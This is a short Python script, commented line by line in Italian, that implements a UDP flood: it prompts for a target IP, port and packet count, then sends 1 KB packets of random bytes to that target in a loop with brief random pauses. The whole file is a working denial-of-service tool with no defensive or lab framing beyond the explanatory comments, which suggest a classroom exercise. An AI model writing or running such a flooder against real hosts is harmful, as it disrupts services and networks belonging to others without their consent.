import socket  # Importa il modulo socket per la gestione delle connessioni di rete
import random  # Importa il modulo random per generare dati casuali
import time    # Importa il modulo time per gestire ritardi temporali

def udp_flood():  # Definisce la funzione udp_flood per eseguire l'invio di pacchetti UDP
    # Input utente
    target_ip = str(input("Inserisci l'IP del target: "))  # Richiede l'IP del target e lo converte in stringa
    target_port = int(input("Inserisci la porta del target (UDP): "))  # Richiede la porta del target e la converte in intero
    num_packets = int(input("Quanti pacchetti da 1KB vuoi inviare? "))  # Richiede il numero di pacchetti da inviare e lo converte in intero

    # Creazione del socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Crea un socket UDP (AF_INET per IPv4, SOCK_DGRAM per UDP)

    # Generazione pacchetto da 1 KB (1024 byte) con dati casuali
    packet = random._urandom(1024)  # Genera un pacchetto di 1024 byte con dati casuali usando _urandom

    print(f"\nInizio invio di {num_packets} pacchetti UDP a {target_ip}:{target_port}...\n")  # Stampa un messaggio che indica l'inizio dell'invio

    for i in range(1, num_packets + 1):  # Ciclo che itera da 1 al numero di pacchetti specificato
        sock.sendto(packet, (target_ip, target_port))  # Invia il pacchetto al target specificato (IP e porta)
        print(f"Pacchetto {i} inviato a {target_ip}:{target_port}")  # Stampa un messaggio per confermare l'invio del pacchetto

        # Ritardo casuale tra 0 e 0.1 secondi
        delay = random.uniform(0, 0.1)  # Genera un ritardo casuale tra 0 e 0.1 secondi
        time.sleep(delay)  # Applica il ritardo per rallentare l'invio dei pacchetti

    print("\nInvio completato.")  # Stampa un messaggio al termine dell'invio dei pacchetti

# Avvio del programma
if __name__ == "__main__":  # Verifica se lo script è eseguito direttamente (non importato come modulo)
    udp_flood()  # Chiama la funzione udp_flood per avviare il programma